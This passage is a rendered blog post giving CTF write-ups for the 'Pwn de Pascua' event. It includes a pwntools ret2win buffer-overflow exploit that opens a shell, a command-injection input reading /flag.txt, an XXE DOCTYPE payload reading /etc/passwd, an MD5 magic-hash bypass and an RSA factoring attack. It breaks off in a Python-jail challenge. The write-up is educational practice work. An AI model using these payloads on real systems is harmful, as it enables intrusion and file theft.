@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="generator" content="Hugo 0.138.0">
+    <title>Lukas Blog</title><link rel="stylesheet" href="http://localhost:1313/css/colors-default-dark.css">
+    <link rel="stylesheet" href="http://localhost:1313/css/style.css">
+    
+</head>
+
+    <body>
+        <div class="site-content">
+            <header>
+                <div class="header-container">
+    <div class="site-header">
+        <a class="site-header" href="http://localhost:1313/">Lukas Blog</a>
+    </div>
+    <div class="site-nav">
+        <nav aria-label="Site menu" class="site-nav"><a class="nav-item active first" href="/post/">posts</a><a class="nav-item last" href="/about/">about</a>
+        </nav>
+    </div>
+</div>
+
+            </header>
+            <main class="content">
+                
+<article class="h-entry">
+    <div class="post-metadata">
+        <h1 class="post-title p-name">PWN de Pascua Writeups</h1>
+        <p class="post-date">
+            <span class="post-date">
+                Published on
+                <a class="u-url" href="http://localhost:1313/post/pwn-pascua-writeups/"><time class="dt-published" datetime="2024-12-21T00:00:00Z">December 21, 2024</time></a>
+                by <img class="u-photo" alt="" src="http://localhost:1313/images/i.jpg"> <a class="p-author h-card" rel="author" href="http://localhost:1313/">Lukas Gaete</a>
+            </span>
+        </p>
+    </div>
+    <div class="post-content e-content">
+        <p>In this post I will share the solutions to the challenges I solved in the &ldquo;Pwn de pascua&rdquo; CTF, played on December 20, 2024. I am pleased to announce that I got the first place in this event, which fills me with satisfaction and motivation.</p>
+<p><img src="https://i.imgur.com/00wdeOq.jpeg" alt=""></p>
+<p>Below, I will explain the approaches and techniques I used to solve each of the challenges presented.</p>
+<h2 id="principiante">principiante</h2>
+<h3 id="aprendere">AprendeRE</h3>
+<p>We are given a binary that we must reverse, analyzing its functions we see that the function <code>check_password()</code> performs an xor with the string <code>wl]qkorng]PG##=#</code>, by performing the reverse we can get the password and solve the challenge.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>target <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;wl]qkorng]PG##=#&#34;</span>
+</span></span><span style="display:flex;"><span>password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(chr(ord(char) <span style="color:#f92672">^</span> <span style="color:#ae81ff">2</span>) <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> target)
+</span></span><span style="display:flex;"><span>print(password)
+</span></span></code></pre></div><p>When we execute it we obtain the password that corresponds to the flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> python3 solve<span style="color:#f92672">.</span>py
+</span></span><span style="display:flex;"><span>un_simple_RE<span style="color:#960050;background-color:#1e0010">!!?!</span>
+</span></span></code></pre></div><h3 id="ret2pwn">ret2pwn</h3>
+<p>This challenge is the typical <code>ret2win</code> challenge, we are given a binary vulnerable to <em>Buffer Overflow</em> with a <code>win()</code> function which returns a shell. The binary in its <code>main()</code> function calls the <code>vuln()</code> function.</p>
+<pre><font color="#DC322F"><b>gef➤  </b></font>disass main
+Dump of assembler code for function <font color="#B58900">main</font>:
+   <font color="#268BD2">0x0000000000401240</font> &lt;+0&gt;:	<font color="#859900">endbr64</font>
+   <font color="#268BD2">0x0000000000401244</font> &lt;+4&gt;:	<font color="#859900">push   </font><font color="#DC322F">rbp</font>
+   <font color="#268BD2">0x0000000000401245</font> &lt;+5&gt;:	<font color="#859900">mov    </font><font color="#DC322F">rbp</font>,<font color="#DC322F">rsp</font>
+   <font color="#268BD2">0x0000000000401248</font> &lt;+8&gt;:	<font color="#859900">mov    </font><font color="#DC322F">eax</font>,<font color="#268BD2">0x0</font>
+   <font color="#268BD2">0x000000000040124d</font> &lt;+13&gt;:	<font color="#859900">call   </font><font color="#268BD2">0x401196</font> &lt;<font color="#B58900">setup</font>&gt;
+   <font color="#268BD2">0x0000000000401252</font> &lt;+18&gt;:	<font color="#859900">mov    </font><font color="#DC322F">eax</font>,<font color="#268BD2">0x0</font>
+   <font color="#268BD2">0x0000000000401257</font> &lt;+23&gt;:	<font color="#859900">call   </font><font color="#268BD2">0x4011f7</font> &lt;<font color="#B58900">vuln</font>&gt;
+   <font color="#268BD2">0x000000000040125c</font> &lt;+28&gt;:	<font color="#859900">mov    </font><font color="#DC322F">eax</font>,<font color="#268BD2">0x0</font>
+   <font color="#268BD2">0x0000000000401261</font> &lt;+33&gt;:	<font color="#859900">pop    </font><font color="#DC322F">rbp</font>
+   <font color="#268BD2">0x0000000000401262</font> &lt;+34&gt;:	<font color="#859900">ret</font>
+End of assembler dump.
+</pre>
+<p>The <code>vuln()</code> function is vulnerable to <em>Buffer Overflow</em> since it defines a buffer of 256 bytes in size and reads up to 512 bytes, giving us room to overflow the stack.</p>
+<pre><font color="#DC322F"><b>gef➤  </b></font>disass vuln
+Dump of assembler code for function <font color="#B58900">vuln</font>:
+   <font color="#268BD2">0x00000000004011f7</font> &lt;+0&gt;:	<font color="#859900">endbr64</font>
+   <font color="#268BD2">0x00000000004011fb</font> &lt;+4&gt;:	<font color="#859900">push   </font><font color="#DC322F">rbp</font>
+   <font color="#268BD2">0x00000000004011fc</font> &lt;+5&gt;:	<font color="#859900">mov    </font><font color="#DC322F">rbp</font>,<font color="#DC322F">rsp</font>
+   <font color="#268BD2">0x00000000004011ff</font> &lt;+8&gt;:	<font color="#859900">sub    </font><font color="#DC322F">rsp</font>,<font color="#268BD2">0x100</font>
+   <font color="#268BD2">0x0000000000401206</font> &lt;+15&gt;:	<font color="#859900">lea    </font><font color="#DC322F">rax</font>,[<font color="#DC322F">rip</font>+<font color="#268BD2">0xdff</font>]<font color="#9F9B8E">        # 0x40200c</font>
+   <font color="#268BD2">0x000000000040120d</font> &lt;+22&gt;:	<font color="#859900">mov    </font><font color="#DC322F">rdi</font>,<font color="#DC322F">rax</font>
+   <font color="#268BD2">0x0000000000401210</font> &lt;+25&gt;:	<font color="#859900">call   </font><font color="#268BD2">0x401070</font> &lt;<font color="#B58900">puts@plt</font>&gt;
+   <font color="#268BD2">0x0000000000401215</font> &lt;+30&gt;:	<font color="#859900">lea    </font><font color="#DC322F">rax</font>,[<font color="#DC322F">rbp</font><font color="#268BD2">-0x100</font>]
+   <font color="#268BD2">0x000000000040121c</font> &lt;+37&gt;:	<font color="#859900">mov    </font><font color="#DC322F">edx</font>,<font color="#268BD2">0x200</font>
+   <font color="#268BD2">0x0000000000401221</font> &lt;+42&gt;:	<font color="#859900">mov    </font><font color="#DC322F">rsi</font>,<font color="#DC322F">rax</font>
+   <font color="#268BD2">0x0000000000401224</font> &lt;+45&gt;:	<font color="#859900">mov    </font><font color="#DC322F">edi</font>,<font color="#268BD2">0x0</font>
+   <font color="#268BD2">0x0000000000401229</font> &lt;+50&gt;:	<font color="#859900">call   </font><font color="#268BD2">0x401090</font> &lt;<font color="#B58900">read@plt</font>&gt;
+   <font color="#268BD2">0x000000000040122e</font> &lt;+55&gt;:	<font color="#859900">lea    </font><font color="#DC322F">rax</font>,[<font color="#DC322F">rip</font>+<font color="#268BD2">0xde3</font>]<font color="#9F9B8E">        # 0x402018</font>
+   <font color="#268BD2">0x0000000000401235</font> &lt;+62&gt;:	<font color="#859900">mov    </font><font color="#DC322F">rdi</font>,<font color="#DC322F">rax</font>
+   <font color="#268BD2">0x0000000000401238</font> &lt;+65&gt;:	<font color="#859900">call   </font><font color="#268BD2">0x401070</font> &lt;<font color="#B58900">puts@plt</font>&gt;
+   <font color="#268BD2">0x000000000040123d</font> &lt;+70&gt;:	<font color="#859900">nop</font>
+   <font color="#268BD2">0x000000000040123e</font> &lt;+71&gt;:	<font color="#859900">leave</font>
+   <font color="#268BD2">0x000000000040123f</font> &lt;+72&gt;:	<font color="#859900">ret</font>
+End of assembler dump.</pre>
+<p>To sum up:</p>
+<ul>
+<li>We must exploit the <em>Buffer Overflow</em> until we overflow the stack.</li>
+<li>Once the stack is overflowed we must align the stack with a RET gadget (we use <code>ROPgadget</code> for this).</li>
+<li>We pass the memory address of the <code>win()</code> function and get a shell.</li>
+</ul>
+<p>With this exploit we solve the challenge.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;0.cloud.chals.io&#39;</span>, <span style="color:#ae81ff">23438</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">264</span>
+</span></span><span style="display:flex;"><span>junk <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> offset
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> junk                          <span style="color:#75715e"># padding</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x000000000040101a</span>)      <span style="color:#75715e"># ret</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00000000004011dd</span>)      <span style="color:#75715e"># win()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>When executed, it returns a shell.</p>
+<pre>$ python3 solve.py 
+[<font color="#859900"><b>+</b></font>] Opening connection to 0.cloud.chals.io on port 23438: Done
+[<font color="#268BD2"><b>*</b></font>] Switching to interactive mode
+A donde? : 
+
+ok, let&apos;s go!
+
+<font color="#DC322F"><b>$</b></font> ls
+flag.txt
+ret2pwn
+<font color="#DC322F"><b>$</b></font> cat flag.txt
+q4{un_simple_ret2pwn_para_apr3nder!}</pre>
+<h3 id="just-decode-it">Just Decode it!</h3>
+<p>We are given a string encoded in base64, we decode it and see that it is in hexadecimal, decode it again and get the flag, use Cyberchef for this.</p>
+<p><img src="https://i.imgur.com/EMPXtA2.png" alt=""></p>
+<h3 id="borrado">Borrado</h3>
+<p>The description of the challenge is as follows.</p>
+<pre tabindex="0"><code>Anoche me tome unos tragos y quede borrado, ayudame a recuperar mi memoria.
+
+Si quieres aprender a resolver retos de tipo Forense, este challenge es un buen comienzo para ti!
+</code></pre><p>We are given an <code>.img</code> and when doing a strings you can see the flag.</p>
+<pre tabindex="0"><code>$ strings challenge.img
+...
+...
+...
+q4{l0_borrado_nunca_esta_borrado}
+</code></pre><h3 id="alive">Alive</h3>
+<p>Web challenge, command injection with the typical <code>;+cat+/flag.txt</code>.</p>
+<p><img src="https://i.imgur.com/fKh93mG.png" alt=""></p>
+<h2 id="web">web</h2>
+<h3 id="al-choque">Al choque!</h3>
+<p>We were given the source code of the application.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#34;flag.php&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;secret&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">md5</span>($_GET[<span style="color:#e6db74">&#39;secret&#39;</span>]) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;0e830400451993494058024219903391&#39;</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">print</span>($flag);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">exit</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;No hay flags aca!&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">exit</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>We see that it includes the file <code>flag.php</code> which contains the flag, then with an if statement it validates if the secret that we enter encrypted to MD5 is equal to <code>0e830400451993494058024219903391</code>, if this is fulfilled it returns the flag, if not it gives us an error. Searching in Google I realized that the hash <code>0e83040045451993494058024219903391</code> was the string <code>QNKCDZO</code>, so with that I could solve the challenge.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl -X GET https://q4-alchoque.chals.io/<span style="color:#ae81ff">\?</span>secret<span style="color:#ae81ff">\=</span>QNKCDZO
+</span></span><span style="display:flex;"><span>q4<span style="color:#f92672">{</span>super_f4c1l_gg_compar1s0n_webwebweb<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h3 id="el_fr33st4lero">El_Fr33st4lero</h3>
+<p>This challenge was one of the ones I liked the most! I spent a lot of time trying to solve it.</p>
+<p>When entering we could see a video of the glorious Matiah Chinaski rapping, when we saw the source code we saw a string that caught my attention <code>//cat</code>, also the video was called <code>cat.mp4</code> so I felt it had to do something with animals. Since I did not find anything I decided to do fuzzing using <code>wfuzz</code> with animal names and extensions, with this command I found the file <code>gato.html</code>.</p>
+<pre tabindex="0"><code>wfuzz -c -t 50 -u https://q4-el-fr33st4lero.chals.io/FUZZFUZ2Z -z file,animales.txt -z file,File-Extensions-Wordlist.txt --hc=404,403
+</code></pre><p>When entering the file we saw a registration form.</p>
+<p><img src="https://i.imgur.com/ssfCAnD.png" alt=""></p>
+<p>When filling the form and intercepting the request we see that the data is processed in XML, I automatically knew that this was an XXE so I injected the typical DOCTYPE and I could read files.</p>
+<pre tabindex="0"><code>&lt;!DOCTYPE foo [&lt;!ENTITY example SYSTEM &#34;/etc/passwd&#34;&gt; ]&gt;
+</code></pre><p><img src="https://i.imgur.com/3t9GaN6.png" alt=""></p>
+<p>Then I was wasting a lot of time looking for the flag, until it occurred to me to look in <code>/etc/</code> and sure enough, there it was!</p>
+<p><img src="https://i.imgur.com/hBaAk5h.png" alt=""></p>
+<h2 id="crypto">crypto</h2>
+<h3 id="babycrypto">babycrypto</h3>
+<p>We receive the encrypted flag and the source code that encrypts it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> flag <span style="color:#f92672">import</span> FLAG
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">enc</span>(plaintext):
+</span></span><span style="display:flex;"><span>    message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i, char <span style="color:#f92672">in</span> enumerate(plaintext):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> char<span style="color:#f92672">.</span>isalpha():
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> char<span style="color:#f92672">.</span>isupper():
+</span></span><span style="display:flex;"><span>                shifted <span style="color:#f92672">=</span> (ord(char) <span style="color:#f92672">-</span> ord(<span style="color:#e6db74">&#39;A&#39;</span>) <span style="color:#f92672">+</span> i) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span>
+</span></span><span style="display:flex;"><span>                message <span style="color:#f92672">+=</span> chr(shifted <span style="color:#f92672">+</span> ord(<span style="color:#e6db74">&#39;A&#39;</span>))
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> char<span style="color:#f92672">.</span>islower():
+</span></span><span style="display:flex;"><span>                shifted <span style="color:#f92672">=</span> (ord(char) <span style="color:#f92672">-</span> ord(<span style="color:#e6db74">&#39;a&#39;</span>) <span style="color:#f92672">+</span> i) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span>
+</span></span><span style="display:flex;"><span>                message <span style="color:#f92672">+=</span> chr(shifted <span style="color:#f92672">+</span> ord(<span style="color:#e6db74">&#39;a&#39;</span>))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            message <span style="color:#f92672">+=</span> char
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> message
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>message <span style="color:#f92672">=</span> enc(FLAG)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Write the encrypted FLAG to an output file</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;message.txt&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(message)
+</span></span></code></pre></div><p>Define an <code>enc()</code> function which encrypts the message using the typical cesar modulo 26 cipher, just write the inverse and the challenge can be solved.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dec</span>(ciphertext):
+</span></span><span style="display:flex;"><span>    plaintext <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i, char <span style="color:#f92672">in</span> enumerate(ciphertext):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> char<span style="color:#f92672">.</span>isalpha():
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> char<span style="color:#f92672">.</span>isupper():
+</span></span><span style="display:flex;"><span>                shifted <span style="color:#f92672">=</span> (ord(char) <span style="color:#f92672">-</span> ord(<span style="color:#e6db74">&#39;A&#39;</span>) <span style="color:#f92672">-</span> i) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span>
+</span></span><span style="display:flex;"><span>                plaintext <span style="color:#f92672">+=</span> chr(shifted <span style="color:#f92672">+</span> ord(<span style="color:#e6db74">&#39;A&#39;</span>))
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> char<span style="color:#f92672">.</span>islower():
+</span></span><span style="display:flex;"><span>                shifted <span style="color:#f92672">=</span> (ord(char) <span style="color:#f92672">-</span> ord(<span style="color:#e6db74">&#39;a&#39;</span>) <span style="color:#f92672">-</span> i) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span>
+</span></span><span style="display:flex;"><span>                plaintext <span style="color:#f92672">+=</span> chr(shifted <span style="color:#f92672">+</span> ord(<span style="color:#e6db74">&#39;a&#39;</span>))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            plaintext <span style="color:#f92672">+=</span> char
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> plaintext
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ciphertext <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;uo_vq4rs_lbjbgc_frjt_knbnzrbt_IQ_WXAYIUZC_G4&#34;</span>
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> dec(ciphertext)
+</span></span><span style="display:flex;"><span>print(flag)
+</span></span></code></pre></div><p>When we executed it, we obtained the flag in plain text.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 solve.py 
+</span></span><span style="display:flex;"><span>un_sm4ll_crypto_para_preparar_EL_PPROXIMO_Q4
+</span></span></code></pre></div><h3 id="minicrypto">miniCrypto</h3>
+<p>This challenge was a vulnerable RSA implementation, since the prime number $q$ was generated in an insecure way and this allowed that by means of <em>Fermat Factorization</em> we could factor $n$ and break the whole cryptosystem. This is the implementation of <em>Fermat Factorization</em> in Python.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">isqrt</span>(n):
+</span></span><span style="display:flex;"><span>    x<span style="color:#f92672">=</span>n
+</span></span><span style="display:flex;"><span>    y<span style="color:#f92672">=</span>(x<span style="color:#f92672">+</span>n<span style="color:#f92672">//</span>x)<span style="color:#f92672">//</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span>(y<span style="color:#f92672">&lt;</span>x):
+</span></span><span style="display:flex;"><span>        x<span style="color:#f92672">=</span>y
+</span></span><span style="display:flex;"><span>        y<span style="color:#f92672">=</span>(x<span style="color:#f92672">+</span>n<span style="color:#f92672">//</span>x)<span style="color:#f92672">//</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> x
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">fermat</span>(n):
+</span></span><span style="display:flex;"><span>    t0<span style="color:#f92672">=</span>isqrt(n)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    counter<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    t<span style="color:#f92672">=</span>t0<span style="color:#f92672">+</span>counter
+</span></span><span style="display:flex;"><span>    temp<span style="color:#f92672">=</span>isqrt((t<span style="color:#f92672">*</span>t)<span style="color:#f92672">-</span>n)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span>((temp<span style="color:#f92672">*</span>temp)<span style="color:#f92672">!=</span>((t<span style="color:#f92672">*</span>t)<span style="color:#f92672">-</span>n)):
+</span></span><span style="display:flex;"><span>        counter<span style="color:#f92672">+=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>        t<span style="color:#f92672">=</span>t0<span style="color:#f92672">+</span>counter
+</span></span><span style="display:flex;"><span>        temp<span style="color:#f92672">=</span>isqrt((t<span style="color:#f92672">*</span>t)<span style="color:#f92672">-</span>n)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">=</span>temp
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">=</span>t<span style="color:#f92672">+</span>s
+</span></span><span style="display:flex;"><span>    q<span style="color:#f92672">=</span>t<span style="color:#f92672">-</span>s
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p,q
+</span></span></code></pre></div><p>When factoring $n$ it is only necessary to do the typical RSA calculations.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> <span style="color:#ae81ff">113297151305912403070580180537218896504689162129151290963870792347548172274828888439339824771092686949516048337709550681895700696862849235103504416930344176272766719097558351724788814246272788549027204516072535618493595756759403872850117463642792662718160145892009731606452724621231186976959981900308189755531</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>q <span style="color:#f92672">=</span> <span style="color:#ae81ff">113297151305912403070580180537218896504689162129151290963870792347548172274828888439339824771092686949516048337709550681895700696862849235103504416930344176272766719097558351724788814246272788549027204516072535618493595756759403872850117463642792662718160145892009731606452724621231186976959981900308189754997</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> p <span style="color:#f92672">*</span> q
+</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x10001</span>
+</span></span><span style="display:flex;"><span>phi <span style="color:#f92672">=</span> (p <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (q <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>d <span style="color:#f92672">=</span> inverse(e, phi)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c <span style="color:#f92672">=</span> <span style="color:#ae81ff">5335936758885879161423355433081046977912425604704954839255728437814818873543632243485494529752176442064203990160911227421739792500178816177216549939700777698916632547957216674152445717172056741243350986611526570455601290091805437221084166967459773081949268202098903185602329736955728542606518569949940633898118323531851517214467309180041904779619873830149073108642740979827115326295272452191775356208119968967436215978408766348998795622791084227177086770364385580014851638733205723845107102103568366094363255217187381857921576152404851953222136602770299643709048596667087952242391567864632554494747483290981146671513</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(long_to_bytes(pow(c, d, n)))
+</span></span></code></pre></div><p>When we execute it we obtain the flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 solve2.py 
+</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;q4{un_p0c0_s0l0_un_p0c0_de_RSA!}&#39;</span>
+</span></span></code></pre></div><h2 id="forense">forense</h2>
+<h3 id="volando">Volando</h3>
+<p>We get a <code>.mem</code> file, using volatily3 we dumpe the processes and we see that there is a string in hexadecimal, we decode it and get the flag.</p>
+<pre tabindex="0"><code>$ python vol.py -f ../q4/memdump.mem windows.cmdline
+
+7456    smartscreen.ex  C:\Windows\System32\smartscreen.exe -Embedding
+6448    q4_mal.exe      &#34;C:\Users\user01\Desktop\q4_mal.exe&#34;
+6452    conhost.exe     ??\C:\Windows\system32\conhost.exe 0x4
+4812    71347B616C676F  &#34;C:\Users\user01\Documents\71347B616C676F5F616E616C317331735F703472345F656C5F6D656D64756D707D.exe&#34;
+
+8136    SearchProtocol  &#34;C:\Windows\system32\SearchProtocolHost.exe&#34; Global\UsGthrFltPipeMssGthrPipe4_ Global\UsGthrCtrlFltPipeMssGthrPipe4 1 -2147483646 &#34;Software\Microsoft\Windows Search&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)&#34; &#34;C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc&#34; &#34;DownLevelDaemon&#34;
+5608    SearchFilterHo  &#34;C:\Windows\system32\SearchFilterHost.exe&#34; 0 828 832 840 8192 836 820
+</code></pre><pre tabindex="0"><code>&gt;&gt;&gt; bytes.fromhex(&#34;71347B616C676F5F616E616C317331735F703472345F656C5F6D656D64756D707D&#34;)
+b&#39;q4{algo_anal1s1s_p4r4_el_memdump}&#39;
+</code></pre><h2 id="jail">jail</h2>
+<h3 id="la-cana">La Cana</h3>
+<p>We must escape from a Python jail, it gives us the source code and the remote instance to connect to.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check</span>(n, a):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> n <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#34;exec&#34;</span>, <span style="color:#e6db74">&#34;compile&#34;</span>, <span style="color:#e6db74">&#34;builtins.input&#34;</span>, <span style="color:#e6db74">&#34;builtins.input/result&#34;</span>]:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;nah! </span><span style="color:#e6db74">{</span>n<span style="color:#e6db74">}</span><span style="color:#e6db74"> y </span><span style="color:#e6db74">{</span>a<span style="color:#e6db74">}</span><span style="color:#e6db74"> prohibidos!&#34;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Chao no mas!&#34;</span>)
+</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sys<span style="color:#f92672">.</span>addaudithook(check)
+</span></span><span style="display:flex;"><span>
